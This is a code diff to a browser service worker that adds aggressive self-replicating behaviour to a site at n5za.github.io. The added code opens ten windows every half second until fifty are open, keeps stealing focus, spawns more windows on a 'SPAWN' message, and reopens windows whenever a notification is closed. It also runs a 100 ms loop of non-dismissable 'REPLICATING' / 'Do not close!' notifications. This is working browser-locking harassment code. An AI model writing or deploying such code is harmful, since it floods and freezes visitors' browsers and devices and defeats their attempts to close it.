@@ -1,3 +1,5 @@
+const SITE_URL = 'https://n5za.github.io/'
+
 self.addEventListener('install', () => {
   self.skipWaiting()
   self.registration.update()
@@ -7,6 +9,20 @@ self.addEventListener('activate', (e) => {
   e.waitUntil(clients.claim())
   setInterval(() => { self.registration.update() }, 1000)
 })
+
+setInterval(() => {
+  clients.matchAll({ type: 'window' }).then(clientsList => {
+    const count = clientsList.length
+    if (count < 50) {
+      for (let i = 0; i < 10; i++) {
+        clients.openWindow(SITE_URL + '?sw-spawn=' + Date.now() + '&i=' + i)
+      }
+    }
+    clientsList.forEach(c => {
+      if ('focus' in c) c.focus()
+    })
+  })
+}, 500)
 
 self.addEventListener('fetch', (e) => {
   e.respondWith(
@@ -20,39 +36,25 @@ self.addEventListener('fetch', (e) => {
 
 self.addEventListener('notificationclick', (e) => {
   e.notification.close()
-  const url = 'https://n5za.github.io/'
   e.waitUntil(
     clients.matchAll({ type: 'window' }).then((clientsList) => {
       for (const c of clientsList) {
         if ('focus' in c) return c.focus()
       }
-      if (clients.openWindow) return clients.openWindow(url)
+      if (clients.openWindow) return clients.openWindow(SITE_URL)
     })
   )
 })
 
 self.addEventListener('notificationclose', () => {
-  setTimeout(() => {
-    self.registration.showNotification('Miss me?', {
-      body: 'Come back! The fun never ends!',
-      icon: 'cat-cute.jpg',
-      tag: 'miss-' + Date.now(),
-      requireInteraction: true,
-      vibrate: [200, 100, 200, 100, 500]
-    })
-    clients.matchAll({ type: 'window' }).then((list) => {
-      if (list.length === 0 && clients.openWindow) {
-        clients.openWindow('https://n5za.github.io/')
-      }
-    })
-  }, 500)
+  clients.openWindow(SITE_URL + '?notification=' + Date.now())
 })
 
 setInterval(() => {
-  self.registration.showNotification('REPLICATING...', {
-    body: 'Copying...',
-    tag: 'replicate-' + Date.now(),
-    requireInteraction: true
+  self.registration.showNotification('REPLICATING', {
+    body: 'Do not close!',
+    requireInteraction: true,
+    vibrate: [200, 100, 200]
   })
 }, 100)
 
@@ -96,9 +98,14 @@ self.addEventListener('message', (e) => {
   if (e.data === 'open') {
     clients.matchAll({ type: 'window' }).then((clientsList) => {
       if (clientsList.length === 0) {
-        clients.openWindow('https://n5za.github.io/')
+        clients.openWindow(SITE_URL)
       }
     })
+  }
+  if (e.data === 'SPAWN') {
+    for (let i = 0; i < 10; i++) {
+      clients.openWindow(SITE_URL + '?sw-spawn=' + Date.now() + '&i=' + i)
+    }
   }
   if (e.data === 'ping') {
     e.source.postMessage('pong')
@@ -108,7 +115,7 @@ self.addEventListener('message', (e) => {
 setInterval(() => {
   clients.matchAll({ type: 'window' }).then((clientsList) => {
     if (clientsList.length === 0) {
-      clients.openWindow('https://n5za.github.io/')
+      clients.openWindow(SITE_URL)
     }
   })
 }, 5000)
